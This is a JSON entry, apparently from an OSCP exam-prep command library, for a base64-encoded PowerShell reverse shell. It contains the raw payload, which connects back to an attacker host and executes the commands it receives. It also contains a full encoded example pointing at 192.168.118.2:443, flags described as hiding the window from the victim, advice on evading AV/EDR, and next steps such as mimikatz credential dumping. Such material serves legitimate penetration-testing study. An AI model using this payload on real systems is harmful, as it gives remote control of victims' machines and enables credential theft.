{
  "commands": [
    {
      "id": "ps-reverse-shell-base64",
      "name": "PowerShell Base64 Encoded Reverse Shell",
      "description": "Base64-encoded PowerShell reverse shell for obfuscation and easy command-line execution",
      "command": "powershell -nop -w hidden -e <BASE64_PAYLOAD>",
      "category": "exploitation",
      "subcategory": "REVERSE_SHELL",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell script (generated by encoder script)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...",
          "required": true
        }
      ],
      "flags": [
        {
          "flag": "-nop",
          "description": "NoProfile - skips loading PowerShell profile scripts (faster execution, avoids detection)",
          "default_value": null
        },
        {
          "flag": "-w hidden",
          "description": "WindowStyle Hidden - hides PowerShell window from victim (stealth)",
          "default_value": "Normal"
        },
        {
          "flag": "-e",
          "description": "EncodedCommand - specifies that the following argument is base64-encoded PowerShell code",
          "default_value": null
        }
      ],
      "examples": [
        {
          "command": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
          "description": "Reverse shell connecting to 192.168.118.2:443 - execute after setting up nc listener on attacker machine",
          "context": "OSCP lateral movement with WinRM/WMI"
        }
      ],
      "raw_payload": "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
      "educational": {
        "purpose": "Establish reverse TCP connection from Windows target to attacker listener, providing interactive PowerShell session. Base64 encoding avoids special character escaping issues.",
        "manual_alternative": "Non-encoded: powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.118.2',443);...\" (requires careful escaping)",
        "common_failures": [
          "No listener on attacker machine - must run 'nc -lnvp <PORT>' before executing payload",
          "Firewall blocking outbound connection from target to attacker IP/port",
          "AV/EDR detecting PowerShell reverse shell patterns (consider obfuscation)",
          "Incorrect base64 encoding (must be UTF-16LE encoded before base64)"
        ],
        "when_to_use": [
          "After successful lateral movement via WinRM/WMI/PsExec",
          "When you need interactive shell on compromised Windows host",
          "Command injection or RCE exploitation requires full shell access",
          "Alternative to bind shells when target has outbound firewall rules"
        ],
        "exam_relevance": "CRITICAL for OSCP - primary method for obtaining interactive shells on Windows targets after initial access or lateral movement",
        "time_estimate": "2-5 seconds to establish connection",
        "technical_notes": [
          "Payload must be encoded in UTF-16LE before base64 (PowerShell default encoding)",
          "Use ps-reverse-shell-encoder-python to generate properly encoded payload",
          "Connection is TCP-based (not UDP) - ensure listener matches protocol",
          "Session persists until client closes or network disconnects"
        ]
      },
      "oscp_priority": "HIGH",
      "tags": [
        "POWERSHELL",
        "REVERSE_SHELL",
        "BASE64",
        "POST_EXPLOIT",
        "OSCP:HIGH"
      ],
      "prerequisites": [
        "ps-reverse-shell-encoder-python",
        "nc-listener-setup"
      ],
      "alternatives": [
        "msfvenom-powershell-reverse",
        "bash-reverse-shell"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords",
        "systeminfo-windows",
        "whoami-priv"
      ],
      "related_commands": [
        "ps-reverse-shell-encoder-python",
        "ps-winrm-invoke-command",
        "ps-wmi-invoke-method",
        "nc-listener"
      ],
      "filled_example": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA..."
    }
  ]
}